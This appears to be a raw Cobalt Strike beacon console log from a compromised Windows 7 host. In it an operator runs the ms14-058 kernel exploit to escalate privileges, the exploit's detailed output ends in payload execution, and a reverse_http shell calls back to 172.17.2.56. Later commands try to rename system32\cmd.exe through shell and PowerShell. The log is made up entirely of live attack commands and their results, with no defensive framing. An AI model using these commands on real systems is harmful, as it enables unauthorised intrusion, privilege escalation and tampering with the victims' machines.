02/03 11:35:24 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 1356; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 11:35:30 [input] <neo> elevate ms14-058 test
02/03 11:35:30 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/03 11:36:20 [checkin] host called home, sent: 104503 bytes
02/03 11:36:21 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c16000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F691FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6C9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C0F9E6C0
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/03 14:26:38 [input] <neo> shell ren c:\windows\system32\cmd.exe cmd_back.exe
02/03 14:26:38 [task] Tasked beacon to run: ren c:\windows\system32\cmd.exe cmd_back.exe
02/03 14:27:37 [checkin] host called home, sent: 75 bytes
02/03 14:27:37 [output]
received output:
存在一个重名文件，或是找不到文件。


02/03 14:28:04 [input] <neo> powershell ren c:\windows\system32\cmd.exe cmd_back.exe
02/03 14:28:04 [task] Tasked beacon to run: ren c:\windows\system32\cmd.exe cmd_back.exe
02/03 14:28:37 [checkin] host called home, sent: 183 bytes
02/03 14:28:38 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Rename-Item : 当文件已存在时，无法创建该文件。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ ren &lt;&lt;&lt;&lt;  c:\windows\system32\cmd.exe cmd_back.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : WriteError: (C:\windows\system32\cmd.exe:String) _x000D__x000A_</S><S S="Error">    [Rename-Item], IOException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : RenameItemIOError,Microsoft.PowerShell.Commands. _x000D__x000A_</S><S S="Error">   RenameItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/03 14:41:09 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 1356; os: Windows; version: 6.1; beacon arch: x86 (x64)
